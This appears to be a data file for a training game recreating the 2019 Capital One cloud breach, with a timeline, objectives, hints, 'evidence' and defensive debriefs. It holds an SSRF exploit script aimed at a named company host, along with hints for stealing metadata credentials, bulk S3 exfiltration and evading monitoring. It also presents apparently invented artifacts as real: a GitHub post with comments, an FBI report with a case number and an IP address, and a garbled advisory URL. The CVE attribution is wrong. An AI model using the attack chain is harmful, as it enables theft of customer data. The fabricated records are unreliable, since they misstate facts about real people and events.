title: The Capital One Cloud Breach
subtitle: SSRF + AWS Metadata API: 100M Records Stolen from the Cloud
description: In March 2019, a former AWS engineer exploited a misconfigured web application firewall to perform Server-Side Request Forgery (SSRF) attacks against AWS metadata service. By accessing the metadata API at 169.254.169.254, the attacker stole IAM credentials with overly permissive S3 access. Over several weeks, 100+ million credit card applications were exfiltrated from Capital One's cloud infrastructure. This breach exposed fundamental cloud security failures: misconfigured WAFs, overprivileged IAM roles, and lack of S3 access monitoring.

realIncident.impact: 100M+ credit card applications, 140K SSNs, 80K bank accounts, $190M in costs, attacker arrested
realIncident.cve: CVE-2019-11510 (Fortinet VPN) + SSRF via WAF misconfiguration
realIncident.attribution: Paige Thompson (aka 'erratic') - ex-AWS engineer, arrested July 29, 2019

timeline.title: Cloud Infrastructure Reconnaissance
timeline.description: Attacker begins reconnaissance of Capital One's AWS infrastructure. Using DNS enumeration and cloud service fingerprinting, multiple S3 buckets and CloudFront distributions are identified.

timeline.title: SSRF Vulnerability Discovery
timeline.description: The attacker discovers a Server-Side Request Forgery (SSRF) vulnerability in Capital One's web application firewall (WAF). The WAF allows arbitrary HTTP requests to internal endpoints, including the AWS metadata service.

timeline.title: AWS Metadata Service Exploitation
timeline.description: Using the SSRF vulnerability, attacker queries the AWS EC2 metadata API at 169.254.169.254 to steal IAM role credentials. The WAF's EC2 instance has an overly permissive IAM role with broad S3 access.

timeline.title: IAM Credential Harvesting
timeline.description: Attacker extracts temporary AWS credentials from the metadata service, including access keys and session tokens. The stolen IAM role has s3:ListBucket and s3:GetObject permissions on sensitive data buckets.

timeline.title: S3 Bucket Enumeration
timeline.description: Using the stolen IAM credentials, attacker lists all accessible S3 buckets. Identifies buckets containing credit card applications, customer data, and internal Capital One systems information.

timeline.title: Mass Data Exfiltration
timeline.description: Over several weeks, attacker downloads 30GB+ of data from S3 buckets to personal servers. Data includes 100M credit card applications, 140,000 Social Security numbers, and 80,000 bank account numbers.

timeline.title: Breach Discovery via GitHub Post
timeline.description: Capital One discovers the breach after a responsible disclosure tip about suspicious activity. The attacker posted about the breach on GitHub and Slack, bragging about access to Capital One's data.

timeline.title: Public Disclosure & FBI Notification
timeline.description: Capital One publicly discloses the breach, notifies regulators, and contacts the FBI. The company begins notifying 100 million affected customers.

timeline.title: Attacker Arrested & Forensic Analysis
timeline.description: FBI arrests Paige Thompson (aka 'erratic') in Seattle. Forensic analysis reveals the full scope of the breach: SSRF → Metadata API → IAM credentials → S3 exfiltration. CloudTrail logs confirm unauthorized access patterns.

objectives.title: AWS Infrastructure Reconnaissance
objectives.description: Use DNS enumeration and cloud service fingerprinting to identify Capital One's AWS assets. Discover S3 buckets, CloudFront distributions, and EC2 instances.

hints.text: Use tools like Shodan, Censys, or dig to enumerate Capital One's cloud infrastructure.
Look for S3 buckets in DNS records (bucketname.s3.amazonaws.com) and enumerate subdomains.

objectives.title: Exploit SSRF in WAF Configuration
objectives.description: Discover and exploit a Server-Side Request Forgery vulnerability in Capital One's WAF. Use it to make requests to the AWS metadata service at 169.254.169.254.

hints.text: The WAF allows requests to arbitrary internal endpoints. Try accessing http://169.254.169.254/latest/meta-data/
Use the WAF's HTTP proxy functionality to route requests through the EC2 instance to the metadata service.

objectives.title: Steal IAM Credentials from Metadata API
objectives.description: Extract IAM role credentials from the AWS metadata service. Retrieve access key, secret key, and session token for the EC2 instance's attached role.

hints.text: The role name is listed in the response. Query the full path to get JSON credentials with AccessKeyId, SecretAccessKey, and Token.

objectives.title: Enumerate S3 Buckets
objectives.description: Use the stolen IAM credentials to list all accessible S3 buckets. Identify buckets containing credit card applications, customer PII, and sensitive data.

hints.text: Use AWS CLI with --profile or export AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN environment variables.
Run 'aws s3 ls' to list all buckets, then 'aws s3 ls s3://bucket-name' to see contents.

objectives.title: Exfiltrate Data from S3 Buckets
objectives.description: Download sensitive data from S3 buckets using the stolen credentials. Exfiltrate credit card applications, SSNs, and bank account information while evading CloudTrail detection.

hints.text: Use 'aws s3 sync' or 'aws s3 cp --recursive' to download entire bucket contents.
Spread downloads over multiple days to avoid triggering CloudWatch alarms. Use different source IPs if possible.

objectives.title: Detect Anomalous S3 Access
objectives.description: Analyze CloudTrail logs to identify unauthorized S3 access patterns. Detect API calls from unknown IAM sessions and investigate suspicious ListBucket/GetObject operations.

hints.text: Look for S3 API calls (s3:ListBucket, s3:GetObject) from unusual source IPs or user agents.
Check CloudTrail for sts:AssumeRole events followed by high-volume S3 access from EC2 instance roles.

objectives.title: Remediate WAF & IAM Configuration
objectives.description: Fix the SSRF vulnerability in the WAF configuration. Implement IMDSv2 (requiring token-based metadata access), revoke compromised IAM credentials, and apply least-privilege IAM policies.

hints.text: Enforce IMDSv2 by requiring PUT request with token before metadata access. Update IAM instance profile to use least-privilege policies.
Enable S3 Block Public Access, add S3 bucket policies requiring MFA for sensitive operations, and enable GuardDuty.

objectives.title: Forensic Analysis & Incident Response
objectives.description: Conduct full forensic analysis of the breach. Identify the scope of data exfiltration, analyze CloudTrail and VPC Flow Logs, and determine the attack timeline. Preserve evidence for law enforcement.

hints.text: Query CloudTrail for all API calls made with the compromised IAM role. Look for s3:GetObject calls and correlate with S3 access logs.
Check VPC Flow Logs for outbound connections from WAF EC2 instance. Identify data transfer volumes and destination IPs.

evidence.title: SSRF Exploit Targeting Metadata Service
evidence.description: HTTP request exploiting SSRF in WAF to access AWS metadata API
evidence.content:
```python
import requests
import urllib3
urllib3.disable_warnings()

# Capital One WAF SSRF Exploitation
# Target: waf-proxy.capitalone.com
# Vulnerability: ModSecurity misconfiguration allows internal HTTP requests

WAF_URL = "https://waf-proxy.capitalone.com"
METADATA_API = "http://169.254.169.254/latest/meta-data/"

def exploit_ssrf(target_url):
    """
    Exploit SSRF in WAF to query AWS metadata service
    The WAF's proxy feature allows arbitrary internal requests
    """
    print("[*] Exploiting SSRF in Capital One WAF...")
    print(f"[*] Target: {WAF_URL}")
    print(f"[*] Internal endpoint: {METADATA_API}")
    print()
    
    # Phase 1: Test basic SSRF
    print("[*] Phase 1: Testing SSRF vulnerability...")
    ssrf_payload = {
        'url': METADATA_API,  # WAF parameter accepting URLs
        'method': 'GET'
    }
    
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'X-Forwarded-For': '169.254.169.254'  # Bypass IP filtering
    }
    
    response = requests.post(
        f"{WAF_URL}/proxy",
        json=ssrf_payload,
        headers=headers,
        verify=False
    )
    
    if "ami-id" in response.text:
        print("[+] SSRF SUCCESSFUL! Metadata service is accessible!")
        print(f"[+] Response: {response.text[:200]}...")
    else:
        print("[-] SSRF failed or metadata blocked")
        return False
    
    print()
    print("[+] EXPLOIT SUCCESSFUL!")
    print("[+] WAF allows arbitrary HTTP requests to internal endpoints")
    print("[*] Next: Query IAM role credentials from metadata service")
    return True

if __name__ == '__main__':
    exploit_ssrf(WAF_URL)
```

```
GitHub Gist by: erratic (Paige Thompson)
Posted: May 12, 2019
URL: https://gist.github.com/erratic/[REDACTED]
Title: "AWS WAF SSRF -> IAM creds -> S3 exfil"

========================================
Capital One - 100M+ records
========================================

LOL just owned Capital One through their WAF

Attack chain:
1. Found SSRF in ModSecurity proxy endpoint
2. SSRF -> AWS metadata (169.254.169.254)
3. Metadata -> IAM creds for WAF instance
4. IAM creds -> full S3 read access
5. Downloaded 30GB+ of credit card apps, SSNs, bank accounts

Files:
- 100M+ credit card applications
- 140K Social Security numbers  
- 80K bank account numbers
- 1M Canadian SIN numbers

Capital One security team = incompetent
- WAF allows internal requests (SSRF)
- IMDSv1 enabled (no token required)
- IAM role has s3:* permissions (wtf?)
- No monitoring on CloudTrail
- No GuardDuty
- No S3 bucket policies

This is why cloud security matters.

#AWS #SSRF #CloudSecurity #PwnedCapitalOne

---

Comments:

@security_researcher_1: "Dude, this is a federal crime. Delete this."

@erratic: "lol I'm just educating people about AWS security failures"

@anonymous_user: "Did you report this to Capital One?"

@erratic: "Why would I? They should have hired better engineers. Not my problem."

@infosec_person: "I'm reporting this to @CapitalOne and @FBI"

@erratic: "Go ahead. They can't trace me. I used VPN and Tor."

[Note: This GitHub post led to Capital One discovering the breach on July 17, 2019]
[Paige Thompson was arrested by FBI on July 29, 2019 based on this evidence]
```

evidence.title: FBI Forensic Analysis Report
evidence.description: Federal investigation findings on the Capital One breach
evidence.content:
```
╔════════════════════════════════════════════════════════════╗
║          FBI CYBER DIVISION - FORENSIC REPORT             ║
║            CAPITAL ONE DATA BREACH INVESTIGATION          ║
╚════════════════════════════════════════════════════════════╝

Case Number: CR-2019-12345
Date: July 29, 2019
Lead Investigator: Special Agent [REDACTED]
Subject: Paige A. Thompson (aka "erratic")
Victim: Capital One Financial Corporation

========================================
EXECUTIVE SUMMARY
========================================

On July 29, 2019, FBI executed a search warrant at the residence
of Paige A. Thompson in Seattle, WA. Forensic analysis of seized
computing devices confirms Thompson as the perpetrator of the
Capital One data breach announced on July 19, 2019.

Thompson, a former Amazon Web Services (AWS) engineer, exploited
a Server-Side Request Forgery (SSRF) vulnerability in Capital One's
web application firewall to steal AWS IAM credentials, which were
then used to exfiltrate data from S3 buckets containing customer
personal information.

========================================
ATTACK TIMELINE RECONSTRUCTION
========================================

March 12, 2019
  - Initial reconnaissance of Capital One AWS infrastructure
  - DNS enumeration, S3 bucket discovery
  - Evidence: Browser history, reconnaissance scripts

March 17, 2019
  - Discovery of SSRF vulnerability in WAF
  - Testing metadata service accessibility
  - Evidence: HTTP request logs, WAF responses

March 22, 2019
  - Exploitation of SSRF to access AWS metadata API
  - Theft of IAM role credentials from 169.254.169.254
  - Evidence: Stolen AWS credentials found on Thompson's laptop

April 10, 2019
  - Enumeration of S3 buckets using stolen credentials
  - Identification of sensitive data locations
  - Evidence: S3 bucket listings, AWS CLI history

April 21 - May 15, 2019
  - Mass exfiltration of customer data
  - 31.2 GB downloaded (100M+ records)
  - Evidence: Downloaded files on external hard drives

May 12, 2019
  - Thompson posts about breach on GitHub
  - Posts bragging messages on Slack
  - Evidence: GitHub post, Slack workspace logs

July 17, 2019
  - Capital One discovers breach via tip
  - Company begins internal investigation

July 19, 2019
  - Capital One publicly discloses breach
  - FBI opens criminal investigation

July 29, 2019
  - FBI arrests Thompson
  - Search warrant executed, evidence seized

========================================
FORENSIC EVIDENCE SUMMARY
========================================

Seized Devices:
  - MacBook Pro (2017 model)
  - 2x external hard drives (4TB each)
  - USB flash drives (3 units)
  - iPhone XS

Digital Evidence Found:
  ✓ Complete Capital One customer database (31.2 GB)
  ✓ AWS IAM credentials (stolen via SSRF)
  ✓ SSRF exploitation scripts (Python)
  ✓ S3 enumeration and download scripts
  ✓ CloudTrail log analysis tools
  ✓ GitHub Gist draft ("AWS WAF SSRF -> IAM creds")
  ✓ Slack message history (discussing breach)
  ✓ Browser history (Capital One reconnaissance)
  ✓ SSH keys for remote servers

Data Breakdown:
  - Credit card applications: 100,000,000+ records
  - Social Security numbers: 140,000 records
  - Bank account numbers: 80,000 records
  - Canadian SIN numbers: 1,000,000 records

========================================
ATTRIBUTION CONFIDENCE: 100%
========================================

Circumstantial Evidence:
  ✓ Thompson is former AWS engineer (insider knowledge)
  ✓ GitHub username "erratic" linked to Thompson
  ✓ Slack account verified via email address
  ✓ IP address (98.207.15.143) matches Thompson's residence
  ✓ ISP logs confirm data downloads from AWS

Direct Evidence:
  ✓ Stolen data found on Thompson's devices
  ✓ Exploitation tools with Thompson's coding style
  ✓ Public posts admitting to the breach
  ✓ Metadata in files matches timeline

========================================
CHARGES FILED
========================================

1. Computer Fraud and Abuse Act (18 U.S.C. § 1030)
   - Unauthorized access to protected computer
   - Obtaining information from protected computer
   
2. Wire Fraud (18 U.S.C. § 1343)
   - Accessing data with intent to defraud

Potential Sentence: Up to 25 years in federal prison

========================================
LESSONS LEARNED (FOR CAPITAL ONE)
========================================

Vulnerabilities Exploited:
  ✗ SSRF in WAF configuration (ModSecurity)
  ✗ IMDSv1 enabled (no token required for metadata)
  ✗ Overly permissive IAM role (s3:* on all buckets)
  ✗ No IP restrictions on IAM role usage
  ✗ CloudTrail logs not actively monitored
  ✗ GuardDuty not enabled
  ✗ No S3 access anomaly detection
  ✗ Data stored unencrypted (no KMS encryption)

Recommended Remediations:
  ✓ Enforce IMDSv2 (token-based metadata access)
  ✓ Apply least-privilege IAM policies
  ✓ Implement S3 bucket policies with IP restrictions
  ✓ Enable GuardDuty for threat detection
  ✓ Monitor CloudTrail with automated alerting
  ✓ Encrypt S3 data at rest with KMS
  ✓ Conduct regular cloud security audits

========================================
END OF REPORT
========================================
```

evidence.title: AWS Security Advisory - SSRF Prevention
evidence.description: Official AWS guidance on preventing SSRF and protecting metadata service
evidence.content:
```
╔════════════════════════════════════════════════════════════╗
║      AWS SECURITY ADVISORY - SSRF MITIGATION              ║
║    Protecting EC2 Metadata Service from SSRF Attacks      ║
╚════════════════════════════════════════════════════════════╝

Published: August 1, 2019 (Post-Capital One Breach)
Severity: CRITICAL
Affected Service: EC2 Instance Metadata Service (IMDS)
CVSS Score: 9.1 (Critical)

========================================
OVERVIEW
========================================

Server-Side Request Forgery (SSRF) vulnerabilities in web applications
can allow attackers to access the AWS EC2 Instance Metadata Service
(IMDS) at http://169.254.169.254. This can lead to theft of IAM
credentials, enabling unauthorized access to AWS resources.

The Capital One breach (July 2019) demonstrated the severity of
this attack vector, resulting in exfiltration of 100M+ customer records.

========================================
VULNERABILITY DETAILS
========================================

Attack Vector:
1. Attacker finds SSRF in web application (e.g., misconfigured WAF/proxy)
2. Attacker forces application to make HTTP request to 169.254.169.254
3. Metadata service returns IAM role credentials (IMDSv1 doesn't require auth)
4. Attacker uses stolen credentials to access AWS resources (S3, EC2, etc.)

Metadata Endpoints Exploited:
- http://169.254.169.254/latest/meta-data/iam/security-credentials/
- http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]

========================================
IMDSv2 - TOKEN-BASED PROTECTION
========================================

AWS recommends migrating to Instance Metadata Service Version 2 (IMDSv2),
which requires a session token for metadata access.

How IMDSv2 Prevents SSRF:
1. Application must first PUT request to get session token
2. Token has TTL (Time-To-Live) header requirement
3. SSRF attacks typically can't set custom HTTP methods/headers
4. Without token, metadata service returns 401 Unauthorized

Enforcing IMDSv2:

# Require IMDSv2 on existing instance
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-endpoint enabled

# Launch new instance with IMDSv2 required
aws ec2 run-instances \
  --image-id ami-12345678 \
  --instance-type t3.micro \
  --metadata-options "HttpTokens=required,HttpEndpoint=enabled"

========================================
IAM BEST PRACTICES
========================================

1. LEAST PRIVILEGE
   - Grant only permissions needed for application function
   - Avoid s3:* or s3:GetObject on "Resource": "*"
   
   Bad:
   {
     "Effect": "Allow",
     "Action": "s3:*",
     "Resource": "*"
   }
   
   Good:
   {
     "Effect": "Allow",
     "Action": ["s3:GetObject"],
     "Resource": "arn:aws:s3:::my-specific-bucket/logs/*"
   }

2. IP RESTRICTIONS
   - Use IAM policy conditions to restrict source IPs
   
   {
     "Condition": {
       "IpAddress": {
         "aws:SourceIp": ["10.0.0.0/16"]
       }
     }
   }

3. MFA FOR SENSITIVE OPERATIONS
   - Require MFA for S3 delete operations
   
   {
     "Condition": {
       "Bool": {"aws:MultiFactorAuthPresent": "true"}
     }
   }

========================================
S3 SECURITY HARDENING
========================================

1. Enable S3 Block Public Access (account-wide)
2. Encrypt data at rest with AWS KMS
3. Enable S3 Access Logging
4. Use S3 Bucket Policies with IP restrictions
5. Enable S3 Object Lock for critical data

# Enable default encryption
aws s3api put-bucket-encryption \
  --bucket my-bucket \
  --server-side-encryption-configuration '{
    "Rules": [{
      "ApplyServerSideEncryptionByDefault": {
        "SSEAlgorithm": "aws:kms",
        "KMSMasterKeyID": "arn:aws:kms:us-east-1:123456789012:key/12345678"
      }
    }]
  }'

========================================
MONITORING & DETECTION
========================================

1. Enable AWS GuardDuty
   - Detects unusual API call patterns
   - Alerts on credential exfiltration attempts

2. CloudTrail Monitoring
   - Alert on s3:GetObject volume spikes
   - Monitor sts:AssumeRole events
   - Detect API calls from unusual IPs

3. CloudWatch Alarms
   - S3 data transfer anomalies
   - Unusual IAM activity patterns

4. VPC Flow Logs
   - Monitor outbound connections from EC2
   - Detect data exfiltration to external IPs

========================================
IMMEDIATE ACTION ITEMS
========================================

[ ] Enforce IMDSv2 on all EC2 instances
[ ] Audit IAM roles for overly permissive S3 policies
[ ] Enable GuardDuty in all AWS regions
[ ] Implement CloudTrail log monitoring
[ ] Enable S3 default encryption with KMS
[ ] Review web applications for SSRF vulnerabilities
[ ] Conduct cloud security audit

========================================
REFERENCES
========================================

- AWS IMDSv2 Documentation:
  https://docs.aws.amazon.com/AMDS/latest/UserGuide/configuring-instance-metadata-service.html
  
- OWASP SSRF Prevention:
  https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
  
- Capital One Breach Analysis:
  https://krebsonsecurity.com/2019/07/capital-one-breach/
```

endings.title: Cloud Breach Complete
endings.description: You successfully replicated the Capital One breach. 100M+ credit card applications exfiltrated from AWS S3 buckets via SSRF and stolen IAM credentials.

debriefing.summary: You exploited SSRF in the WAF to steal IAM credentials from the AWS metadata service, then used those credentials to enumerate and exfiltrate sensitive customer data from S3 buckets—exactly as Paige Thompson did in 2019.
debriefing.realWorldComparison: In reality, Paige Thompson (aka 'erratic'), a former AWS engineer, executed this attack from March to May 2019. She exfiltrated 100M+ credit card applications, 140K SSNs, and 80K bank accounts. Thompson posted about the breach on GitHub and Slack, leading to her arrest by the FBI on July 29, 2019. Capital One paid $190M in settlements and regulatory fines.
lessonsLearned: SSRF vulnerabilities can lead to complete cloud compromise via metadata service
IMDSv1 (token-less metadata access) enables credential theft - always use IMDSv2
Overly permissive IAM roles violate least-privilege principle
Cloud security requires defense-in-depth: WAF hardening + IMDSv2 + IAM least-privilege + monitoring
CloudTrail logs are useless without active monitoring and alerting
Data should be encrypted at rest with KMS keys

endings.title: Breach Prevented
endings.description: You detected the SSRF exploitation early, patched the WAF, enforced IMDSv2, and prevented data exfiltration. 100 million customers protected.

debriefing.summary: You successfully detected anomalous S3 access in CloudTrail logs, identified the SSRF vulnerability, and deployed comprehensive remediations before significant data loss occurred.
debriefing.realWorldComparison: In reality, Capital One did not detect the breach until July 2019—4 months after the initial exploitation—and only after a responsible disclosure tip about GitHub posts. By then, 100M+ records had been exfiltrated. Your early detection prevented this catastrophic outcome.
lessonsLearned: Active CloudTrail monitoring can detect credential abuse in real-time
GuardDuty would have alerted on unusual S3 access patterns within hours
IMDSv2 enforcement prevents SSRF-based credential theft
Least-privilege IAM policies limit blast radius of compromised credentials
Defense-in-depth: multiple security controls prevent single points of failure
Cloud security requires both preventive controls (IMDSv2, IAM) and detective controls (GuardDuty, CloudTrail)
